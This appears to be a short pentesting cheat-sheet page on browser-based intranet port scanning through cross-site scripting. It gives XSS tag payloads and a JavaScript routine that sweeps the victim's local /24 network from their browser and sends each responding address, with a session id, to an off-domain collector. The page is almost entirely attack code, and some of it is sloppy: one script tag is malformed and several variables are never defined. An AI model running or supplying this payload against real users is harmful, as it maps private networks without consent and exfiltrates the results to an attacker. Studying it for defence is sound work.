---
author(s):
  - Userware
tags:
  - helpers
  - webapp-pentesting
  - client-side-attacks
  - cross-site-scripting
---
# Port Scanning

```
<script>src="http://[::]:8000/image.jpg"</script>
<img src="http://[::]:8000/image.jpg"><img>
```

```js
/* Event Capturing */
window.onerror = err;

/* launch the Intranet scan */
scanWebServers(internal_ip);

/* scan the Intranet */
function scanWebServers(ip) {
    /* strip the last octet off the Intranet IP */
    var net = ip.substring(0, ip.lastIndexOf('.') + 1);

    /* Start from 0 and end on 255 for the last octet */
    var start = 0;
    var end = 255;
    var x = start;
    var timeout = 0;

    /* section sets up and increments setTimeout timers with periodic window.stop(). We
    use this because if there is no web server at the specified IP, the browser will
    hang for an overly long time until the timeout expires. If we fire too many hanging
    off-domain connections we'll cause on browser connection DoS. window.stop() halts
    all open connects so the scan process can move on. */
    while (x < end) {
        timeout += 500;
        var y = x + 20;
        if (y > end) { y = end; }

        /* send a block of IPs to be scanned */
        setTimeout("scan(" + x + ", " + y + ", '" + net + "')", timeout);
        timeout += 6000;
        self.setTimeout("window.stop();", timeout);
        x += 21;
    }
} // end scanWebServers

/* scan a block of IPs */
function scan(start, end, range) {
    var start_num = 0;
    if (start) { start_num = start; }
    var end_num = 255;
    if (end) { end_num = end; }

    // loop through number range
    for (var n = start_num; n <= end_num; n++) {
        // create src attribute with constructed URL
        var URL = 'http://' + range + n + '/';

        // create script DOM object
        if (debug['portscan']) {
            var script = document.createElement('script');
            script.src = URL;

            // add script DOM object to the body
            document.body.appendChild(script);
        }
    } // end number range loop
} // end scan subroutine

/* capture window errors caused by the port scan */
function err(msg, loc, a, b) {
    /* An error message of "Error loading script" indicates the IP did not respond.
    Anything else likely indicates that something is listening and sent data back which
    caused an error. */
    if (! msg.match(/Error loading script/)) {
        var img = new Image();
        var src = off_domain + 'session=' + sessionid + "&action=portscan&ip=" +
        escape(loc);
        img.src = src;
    }
    return;
} // end err subroutine
```

---
## References

### Hacktricks

- [Hacktricks: XSS (Cross Site Scripting)](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)

### Pentest Tools

- [Pentest Tools: 10 Practical scenarios for XSS attacks](https://pentest-tools.com/blog/xss-attacks-practical-scenarios)